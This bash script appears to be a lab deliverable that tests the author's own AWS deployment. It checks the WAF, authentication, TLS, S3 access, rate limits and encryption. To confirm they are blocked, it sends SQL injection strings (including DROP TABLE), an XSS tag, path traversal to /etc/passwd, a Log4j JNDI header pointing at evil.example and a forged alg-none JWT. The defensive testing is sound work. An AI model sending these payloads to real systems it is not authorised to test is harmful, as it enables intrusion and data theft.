#!/usr/bin/env bash
# Security tests against YOUR OWN deployment only (allowed under the AWS penetration-testing policy for
# the services used here; no DoS/flooding). Screenshot the output for Deliverable 5.
#   ./scripts/security_tests.sh https://dxxxx.cloudfront.net
set -uo pipefail
BASE="${1:?usage: security_tests.sh <cloudfront-url>}"
code() { curl -s -o /dev/null -w "%{http_code}" "$@"; }
check() { printf "%-62s expected %-4s got %s\n" "$1" "$2" "$3"; }

echo "== 1. WAF: SQL injection, XSS and bad inputs (expect 403 Forbidden from WAF)"
check "SQLi in query string  ' OR 1=1--"       403 "$(code "$BASE/api/products?category=pottery'%20OR%201=1--")"
check "SQLi UNION SELECT"                       403 "$(code "$BASE/api/products?id=1%20UNION%20SELECT%20password%20FROM%20users")"
check "XSS <script> in query"                   403 "$(code "$BASE/api/products?q=%3Cscript%3Ealert(1)%3C/script%3E")"
check "SQLi in JSON body to /api/orders"        403 "$(code -X POST -H 'Content-Type: application/json' \
      -d '{"items":[{"sku":"1;DROP TABLE orders;--","quantity":1}],"shippingCountry":"ZA"}' "$BASE/api/orders")"
check "Path traversal ../../etc/passwd"         403 "$(code "$BASE/app/../../etc/passwd")"
check "Log4j JNDI lookup header"                403 "$(code -H 'User-Agent: ${jndi:ldap://evil.example/a}' "$BASE/")"

echo "== 2. Authentication bypass attempts on POST /api/orders (expect 401)"
VALID='{"items":[{"sku":"POT-001","quantity":1}],"shippingCountry":"ZA"}'
check "No Authorization header"                 401 "$(code -X POST -H 'Content-Type: application/json' -d "$VALID" "$BASE/api/orders")"
check "Forged JWT (alg none)"                   401 "$(code -X POST -H 'Content-Type: application/json' \
      -H 'Authorization: eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.' -d "$VALID" "$BASE/api/orders")"
check "Random bearer token"                     401 "$(code -X POST -H 'Content-Type: application/json' \
      -H 'Authorization: Bearer abc.def.ghi' -d "$VALID" "$BASE/api/orders")"

echo "== 3. Transport security"
check "HTTP is redirected to HTTPS"             301 "$(code "${BASE/https:/http:}/")"
echo "   TLS protocol negotiated: $(curl -s -o /dev/null -w '%{ssl_version}' "$BASE/" 2>/dev/null || echo n/a)"
curl -sI "$BASE/" | grep -iE "strict-transport-security|x-frame-options|x-content-type-options"

echo "== 4. Direct S3 access must be denied (bucket is private, CloudFront OAC only)"
SITE_BUCKET=$(aws cloudformation describe-stacks --stack-name satc-lab-edge \
  --query "Stacks[0].Outputs[?OutputKey=='SiteBucketName'].OutputValue" --output text 2>/dev/null)
REGION=$(aws configure get region)
[ -n "$SITE_BUCKET" ] && check "https://$SITE_BUCKET.s3.amazonaws.com/index.html" 403 \
  "$(code "https://$SITE_BUCKET.s3.$REGION.amazonaws.com/index.html")"

echo "== 5. Rate limiting (API Gateway throttling 50 rps/burst 100; WAF 2000 req/5 min per IP)"
echo "   Sending 300 quick requests - watch for 429 (API Gateway) or 403 (WAF) responses:"
for i in $(seq 1 300); do code "$BASE/api/products" & done | sort | uniq -c
wait

echo "== 6. Encryption at rest and public-access checks"
aws s3api list-buckets --query "Buckets[?starts_with(Name,'satc-')].Name" --output text | tr '\t' '\n' | while read -r b; do
  enc=$(aws s3api get-bucket-encryption --bucket "$b" --query "ServerSideEncryptionConfiguration.Rules[0].ApplyServerSideEncryptionByDefault.SSEAlgorithm" --output text 2>/dev/null)
  pab=$(aws s3api get-public-access-block --bucket "$b" --query "PublicAccessBlockConfiguration.BlockPublicPolicy" --output text 2>/dev/null)
  printf "   %-55s encryption=%-8s block-public=%s\n" "$b" "$enc" "$pab"
done
aws rds describe-db-instances --query "DBInstances[].[DBInstanceIdentifier,StorageEncrypted,MultiAZ,BackupRetentionPeriod]" --output table
for t in satc-lab-products satc-lab-inventory; do
  aws dynamodb describe-table --table-name "$t" --query "Table.[TableName,SSEDescription.SSEType,SSEDescription.Status]" --output text
done
